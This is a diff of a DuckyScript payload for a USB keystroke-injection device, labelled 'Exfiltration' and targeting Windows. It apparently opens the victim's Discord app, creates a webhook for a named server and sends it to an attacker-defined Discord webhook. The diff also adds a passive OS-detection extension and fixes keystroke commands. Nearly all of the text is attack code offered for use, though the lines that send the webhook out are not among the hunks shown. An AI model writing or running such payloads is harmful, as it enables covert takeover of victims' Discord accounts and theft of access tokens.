@@ -1,24 +1,68 @@
-REM ###############################################################
-REM #                                                             |
-REM # Title        : Create And Exfiltrate A Webhook Of Discord   |
-REM # Author       : Aleff                                        |
-REM # Version      : 1.0                                          |
-REM # Category     : Exfiltration                                 |
-REM # Target       : Windows 10-11                                |
-REM #                                                             |
-REM ###############################################################
+REM_BLOCK
+###############################################################
+#                                                             #
+# Title        : Create And Exfiltrate A Webhook Of Discord   #
+# Author       : Aleff                                        #
+# Version      : 1.0                                          #
+# Category     : Exfiltration                                 #
+# Target       : Windows 10-11                                #
+#                                                             #
+###############################################################
+END_REM
 
 
 REM Requirements:
 REM     - Internet connection
 REM     - Discord Installed
 
-
 REM You must define the Discord server name i.e. Hak5
 DEFINE #SERVER_NAME example
 
 REM You must define your Discord webhook if you want to use this method for the exfiltration
 DEFINE #DISCORD_WEBHOOK example
+
+EXTENSION PASSIVE_WINDOWS_DETECT
+    REM VERSION 1.1
+    REM AUTHOR: Korben
+
+    REM_BLOCK DOCUMENTATION
+        Windows fully passive OS Detection and passive Detect Ready
+        Includes its own passive detect ready.
+        Does not require additional extensions.
+
+        USAGE:
+            Extension runs inline (here)
+            Place at beginning of payload (besides ATTACKMODE) to act as dynamic
+            boot delay
+            $_OS will be set to WINDOWS or NOT_WINDOWS
+            See end of payload for usage within payload
+    END_REM
+
+    REM CONFIGURATION:
+    DEFINE #MAX_WAIT 150
+    DEFINE #CHECK_INTERVAL 20
+    DEFINE #WINDOWS_HOST_REQUEST_COUNT 2
+    DEFINE #NOT_WINDOWS 7
+
+    $_OS = #NOT_WINDOWS
+
+    VAR $MAX_TRIES = #MAX_WAIT
+    WHILE(($_RECEIVED_HOST_LOCK_LED_REPLY == FALSE) && ($MAX_TRIES > 0))
+        DELAY #CHECK_INTERVAL
+        $MAX_TRIES = ($MAX_TRIES - 1)
+    END_WHILE
+    IF ($_HOST_CONFIGURATION_REQUEST_COUNT > #WINDOWS_HOST_REQUEST_COUNT) THEN
+        $_OS = WINDOWS
+    END_IF
+
+    REM_BLOCK EXAMPLE USAGE AFTER EXTENSION
+        IF ($_OS == WINDOWS) THEN
+            STRING HELLO WINDOWS!
+        ELSE
+            STRING HELLO WORLD!
+        END_IF
+    END_REM
+END_EXTENSION
 
 REM Open Discord app
 GUI
@@ -74,11 +118,11 @@ TAB
 DELAY 500
 TAB
 DELAY 500
-DOWN_ARROW
+DOWNARROW
 DELAY 500
-DOWN_ARROW
+DOWNARROW
 DELAY 500
-DOWN_ARROW
+DOWNARROW
 DELAY 500
 ENTER
 DELAY 500
